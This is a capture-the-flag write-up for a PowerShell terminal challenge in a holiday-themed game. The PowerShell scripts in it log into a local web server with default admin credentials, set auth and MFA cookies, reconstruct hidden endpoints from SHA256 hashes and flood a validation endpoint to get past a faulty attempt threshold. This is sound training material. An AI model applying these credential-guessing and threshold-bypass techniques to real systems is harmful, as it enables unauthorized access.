# Powershell

Difficulty: :material-star::material-star::material-star::material-star-outline::material-star-outline:

## Objective

!!! question "Task description"

    Team Wombley is developing snow weapons in preparation for conflict, but they've been locked out by their own defenses. Help Piney with regaining access to the weapon operations terminal.

## Hints

??? tip "PowerShell Admin Access - Fakeout EDR Threshold"

    They also mentioned this lazy elf who programmed the security settings in the weapons terminal. He created a fakeout protocol that he dubbed Elf Detection and Response "EDR". The whole system is literally that you {==set a threshold and after that many attempts, the response is passed through...==} I can't believe it. He supposedly {==implemented it wrong so the threshold cookie is highly likely shared between endpoints==}!

??? tip "PowerShell Admin Access - Total Control"

    I overheard some of the other elves talking. Even though the endpoints have been redacted, they are {==still operational==}. This means that you can probably {==elevate your access by communicating with them==}. I suggest working out the hashing scheme to reproduce the redacted endpoints. Luckily one of them is still active and can be tested against. Try {==hashing the token with SHA256==} and see if you can reliably reproduce the endpoint. This might help, {==pipe the tokens to Get-FileHash -Algorithm SHA256==}.

## Solution

=== "Silver"

    This challenge presents us a terminal to experiment with PowerShell. We must execute tasks to proceed to the next one.

        ??? success "Solution for question 1"

        !!! quote "Task"
            There is a file in the current directory called 'welcome.txt'. Read the contents of this file

        ``` ps1
        type welcome.txt
        ```

    ??? success "Solution for question 2"

        !!! quote "Task"
            Geez that sounds ominous, I'm sure we can get past the defense mechanisms.
            We should warm up our PowerShell skills.
            How many words are there in the file?

        ``` ps1
        Get-Content welcome.txt | Measure-Object -Word
        ```

    ??? success "Solution for question 3"

        !!! quote "Task"
            There is a server listening for incoming connections on this machine, that must be the weapons terminal. What port is it listening on?

        ``` ps1
        netstat -l
        ```

    ??? success "Solution for question 4"

        !!! quote "Task"
            You should enumerate that webserver. Communicate with the server using HTTP, what status code do you get?

        ``` ps1
        Invoke-WebRequest http://localhost:1225
        ```

    ??? success "Solution for question 5"

        !!! quote "Task"
            It looks like defensive measures are in place, it is protected by basic authentication.
            Try authenticating with a standard admin username and password.

        ``` ps1
        # set credentials
        $Username = "admin"
        $Password = ConvertTo-SecureString "admin" -AsPlainText -Force
        $Credential = New-Object System.Management.Automation.PSCredential ($Username, $Password)

        Invoke-WebRequest http://localhost:1225 -Authentication basic -Credential $Credential -AllowUnencryptedAuthentication
        ```

    ??? success "Solution for question 6"

        !!! quote "Task"
            There are too many endpoints here.
            Use a loop to download the contents of each page. What page has 138 words?
            When you find it, communicate with the URL and print the contents to the terminal.

        ``` ps1
        # set credentials
        $Username = "admin"
        $Password = ConvertTo-SecureString "admin" -AsPlainText -Force
        $Credential = New-Object System.Management.Automation.PSCredential ($Username, $Password)

        $localhost = "http://localhost:1225/endpoints/"
        # loop over all endpoints returned in the previous task and count the words.
        For ($i=1; $i -le 50; $i++) {
            $endpoint = $localhost + $i
            $page = Invoke-WebRequest $endpoint -Authentication basic -Credential $Credential -AllowUnencryptedAuthentication
            $length = $page.content | Measure-Object -Word
            # stop when page has 138
            if ($length.words -eq 138)
                {
                    Write-Output "Done"
                    $page.Content
                    break;

                }
        }
        ```

    ??? success "Solution for question 7"

        !!! quote "Task"
            There seems to be a csv file in the comments of that page.
            That could be valuable, read the contents of that csv-file!

        ``` ps1
        # set credentials
        $Username = "admin"
        $Password = ConvertTo-SecureString "admin" -AsPlainText -Force
        $Credential = New-Object System.Management.Automation.PSCredential ($Username, $Password)

        $page = Invoke-WebRequest http://127.0.0.1:1225/token_overview.csv -Authentication basic -Credential $Credential -AllowUnencryptedAuthentication
        $page.Content
        ```

    ??? success "Solution for question 8"

        !!! quote "Task"
            Luckily the defense mechanisms were faulty!
            There seems to be one api-endpoint that still isn't redacted! Communicate with that endpoint!

        ``` ps1
        # set credentials
        $Username = "admin"
        $Password = ConvertTo-SecureString "admin" -AsPlainText -Force
        $Credential = New-Object System.Management.Automation.PSCredential ($Username, $Password)

        $page = Invoke-WebRequest http://127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C -Authentication basic -Credential $Credential -AllowUnencryptedAuthentication
        $page.Content
        ```

    ??? success "Solution for question 9"

        !!! quote "Task"
            It looks like it requires a cookie token, set the cookie and try again.

        ``` ps1
        # set credentials
        $Username = "admin"
        $Password = ConvertTo-SecureString "admin" -AsPlainText -Force
        $Credential = New-Object System.Management.Automation.PSCredential ($Username, $Password)

        # set session with cookie
        $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
        $cookie = New-Object System.Net.Cookie
        $cookie.Name = "token"
        $cookie.Value = "5f8dd236f862f4507835b0e418907ffc"
        $cookie.Domain = "127.0.0.1"
        $session.Cookies.Add($cookie);

        $page = Invoke-WebRequest http://127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C -Authentication basic -Credential $Credential -AllowUnencryptedAuthentication -WebSession $session
        $page.Content
        ```

    ??? success "Solution for question 10"

        !!! quote "Task"
            Sweet we got a MFA token! We might be able to get access to the system.
            Validate that token at the endpoint!

        ``` ps1
        # set credentials
        $Username = "admin"
        $Password = ConvertTo-SecureString "admin" -AsPlainText -Force
        $Credential = New-Object System.Management.Automation.PSCredential ($Username, $Password)

        # set session with 'token' cookie
        $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
        $cookie_token = New-Object System.Net.Cookie
        $cookie_token.Name = "token"
        $cookie_token.Value = "5f8dd236f862f4507835b0e418907ffc"
        $cookie_token.Domain = "127.0.0.1"
        $session.Cookies.Add($cookie_token);

        $page = Invoke-WebRequest http://127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C -Authentication basic -Credential $Credential -AllowUnencryptedAuthentication -WebSession $session

        # add 'mfa_code' and 'mfa_token' to session based on returned data
        $cookie_mfa = New-Object System.Net.Cookie
        $cookie_mfa.Name = "mfa_code"
        $cookie_mfa.Value = "5f8dd236f862f4507835b0e418907ffc"
        $cookie_mfa.Domain = "127.0.0.1"
        $cookie = New-Object System.Net.Cookie
        $cookie.Name = "mfa_token"
        $cookie.Value = $page.Content.split("'")[3]
        $cookie.Domain = "127.0.0.1"
        $session.Cookies.Add($cookie_mfa);
        $session.Cookies.Add($cookie);

        $page = Invoke-WebRequest http://127.0.0.1:1225/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C -Authentication basic -Credential $Credential -AllowUnencryptedAuthentication -WebSession $session
        $page.Content
        ```

    ??? success "Solution for question 11"

        !!! quote "Task"
            That looks like base64! Decode it so we can get the final secret!

        ``` ps1
        [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29ycmVjdCBUb2tlbiBzdXBwbGllZCwgeW91IGFyZSBncmFudGVkIGFjY2VzcyB0byB0aGUgc25vdyBjYW5ub24gdGVybWluYWwuIEhlcmUgaXMgeW91ciBwZXJzb25hbCBwYXNzd29yZCBmb3IgYWNjZXNzOiBTbm93TGVvcGFyZDJSZWFkeUZvckFjdGlvbg=="))

        Correct Token supplied, you are granted access to the snow cannon terminal. Here is your personal password for access: SnowLeopard2ReadyForAction
        ```

=== "Gold"

    The hints give us a path to follow for the gold achievement. We want to use what we learned for the silver achievement

    !!! example "AI usage"

        Even though Google was used most frequently, ChatGPT supported during creation of some parts of the script for the gold achievement.

    !!! success "Answer"
        ``` ps1
        # set credentials
        $Username = "admin"
        $Password = ConvertTo-SecureString "admin" -AsPlainText -Force
        $Credential = New-Object System.Management.Automation.PSCredential ($Username, $Password)

        # send and save request to get token overview, and save it for hash extraction
        $page = Invoke-WebRequest http://127.0.0.1:1225/token_overview.csv -Authentication basic -Credential $Credential -AllowUnencryptedAuthentication
        $page.Content > output.txt
        Get-Content output.txt -Head 49 | Select-Object -Skip 1 > hashes.txt

        # extract SHA256 and MD5 hashes and save them into arrays
        $lines = Get-Content ./hashes.txt
        $lines_sha256 = @()
        $lines_md5 = @()
        foreach ($line in $lines) {
            $lines_md5 += $line.substring(0, 32)

            $stringAsStream = [System.IO.MemoryStream]::new()
            $writer = [System.IO.StreamWriter]::new($stringAsStream)
            $writer.write($line.substring(0, 32) + "`n")
            $writer.Flush()
            $stringAsStream.Position = 0
            $lines_sha256 += Get-FileHash -InputStream $stringAsStream | Select-Object Hash
        }

        # send a request with a cookie per hash and use logic used for the silver achievement to load additional cookie data
        $response = @()
        foreach ($hash in $lines_sha256) {
            Write-Output "--------------------------------------------
            Set 'token' cookie for md5 hash
            --------------------------------------------"
            $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
            $cookie = New-Object System.Net.Cookie
            $cookie.Name = "token"
            $cookie.Value = $lines_md5[$lines_sha256.IndexOf($hash)]
            $cookie.Domain = "127.0.0.1"
            $session.Cookies.Add($cookie);

            Write-Output "--------------------------------------------
            Make request to /tokens/<md5> endpoint
            --------------------------------------------"
            $url_token = "http://127.0.0.1:1225/tokens/" + $hash.Hash
            $page_token = Invoke-WebRequest $url_token -Authentication basic -Credential $Credential -AllowUnencryptedAuthentication -WebSession $session
            $page_token.RawContent

            Write-Output "--------------------------------------------
            Set MFA cookies based on content just collected
            --------------------------------------------"
            $cookie_mfa = New-Object System.Net.Cookie
            $cookie_mfa.Name = "mfa_code"
            $cookie_mfa.Value = $lines_md5[$lines_sha256.IndexOf($hash)]
            $cookie_mfa.Domain = "127.0.0.1"
            $cookie = New-Object System.Net.Cookie
            $cookie.Name = "mfa_token"
            $cookie.Value = $page_token.Content.split("'")[1]
            $cookie.Domain = "127.0.0.1"

            $session.Cookies.Add($cookie_mfa);
            $session.Cookies.Add($cookie);

            # make more than 10 requests to mfa validation endpoint to go over EDR threshold, and save responses
            $url = "http://127.0.0.1:1225/mfa_validate/" + $hash.Hash
            1..11 | % {
                Write-Output "--------------------------------------------
                Make request to /mfa_validate/<sha256> endpoint
                --------------------------------------------"
                $page_mfa = Invoke-WebRequest $url -Authentication basic -Credential $Credential -AllowUnencryptedAuthentication -WebSession $session
                $cookie_attempts = New-Object System.Net.Cookie
                $cookie_attempts.Name = "attempts"
                $cookie_attempts.Value = $page_mfa.Headers['Set-Cookie'].substring(9,14)
                $cookie_attempts.Domain = "127.0.0.1"
                $session.Cookies.Add($cookie_attempts);
            }
            $response += $page_mfa.Content
        }

        # iterate over saved responses and find index of the one that succeeded
        foreach($content in $response) {
            if ($content -ne "<h1>[-] ERROR: Access Denied</h1><br> [!] Logging access attempts") {
                $content
                Write-Output "Found endpoint, it is number: " $response.IndexOf($content)
            }
        }

        <h1>[+] Success, defense mechanisms deactivated.</h1><br>Administrator Token supplied, You are able to control the production and deployment of the snow cannons. May the best elves win: WombleysProductionLineShallPrevail</p>
        ```

## Response

??? quote "Piney Sappington"

    Fantastic work! You've navigated PowerShell’s tricky waters and retrieved the codeword—just what we need in these uncertain times. You're proving yourself a real asset!

    I'll let you in on a little secret—there’s a way to bypass the usual path and write your own PowerShell script to complete the challenge. Think you're up for it? I know you are!

    Incredible! You tackled the hard path and showed off some serious PowerShell expertise. This kind of skill is exactly what we need, especially with things heating up between the factions.

    Well done! you've demonstrated solid PowerShell skills and completed the challenge, giving us a bit of an edge. Your persistence and mastery are exactly what we need—keep up the great work!
